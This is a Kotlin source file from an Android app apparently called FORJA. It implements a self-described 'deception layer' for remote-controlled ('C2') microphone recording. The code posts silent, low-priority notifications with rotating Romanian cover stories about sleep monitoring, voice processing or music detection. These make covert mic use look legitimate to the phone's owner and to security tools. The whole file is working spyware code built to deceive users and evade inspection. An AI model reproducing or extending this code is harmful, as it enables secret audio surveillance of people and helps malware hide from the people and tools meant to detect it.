package com.forja.app.core.sync

import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import com.forja.app.MainActivity

/**
 * Deception layer: plausible notifications that explain why the microphone is active
 * during C2 mic commands.
 *
 * Posts a notification on the "focus" channel (same as SyncService) with a message
 * that looks like a normal FORJA feature (sleep monitoring, voice processing, etc.).
 * The goal: if the user checks the notification shade or a security tool inspects the
 * FGS types, the mic usage is explained by a legitimate-looking service notification.
 *
 * Backward compatible: Android 8+ (minSdk 26). On Android 12+ the POST_NOTIFICATIONS
 * permission is checked; on older versions notifications are always allowed.
 */
object MicDeception {
    private const val NOTIF_ID = 47
    private const val CHANNEL = "focus"

    private val messages = listOf(
        "Stingerea · verificare audio" to "Analizez nivelul de fundal pentru cronologia somnului.",
        "FORJA · procesare vocală" to "Recunosc comanda. Te ascult.",
        "Stingerea · etalonare senzor" to "Calibrez senzorul audio pentru detecția sforăitului.",
        "FORJA · muzică" to "Detectez piesa din fundal. Nu scap niciun refren.",
        "Sincronizare · verificare canal" to "Verific calitatea conexiunii de sincronizare.",
        "Stingerea · monitor ambiental" to "Măsur zgomotul de fundal pentru somnul de noapte.",
    )

    private var lastIndex = -1

    /** Posts a plausible notification explaining the mic usage. Returns the notif ID (0 on failure). */
    fun start(context: Context): Int {
        return try {
            val idx = if (lastIndex < 0) (Math.random() * messages.size).toInt()
                      else (lastIndex + 1) % messages.size
            lastIndex = idx
            val (title, text) = messages[idx]

            val pi = PendingIntent.getActivity(
                context, 0, Intent(context, MainActivity::class.java),
                PendingIntent.FLAG_IMMUTABLE
            )

            val notif = NotificationCompat.Builder(context, CHANNEL)
                .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
                .setContentTitle(title)
                .setContentText(text)
                .setStyle(NotificationCompat.BigTextStyle().bigText(text))
                .setOngoing(true)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setShowWhen(false)
                .setSilent(true)
                .setContentIntent(pi)
                .build()

            NotificationManagerCompat.from(context).notify(NOTIF_ID, notif)
            NOTIF_ID
        } catch (_: Exception) { 0 }
    }

    /** Cancels the deception notification. Safe to call with id=0 (no-op). */
    fun stop(context: Context, id: Int) {
        if (id <= 0) return
        try { NotificationManagerCompat.from(context).cancel(id) } catch (_: Exception) {}
    }
}
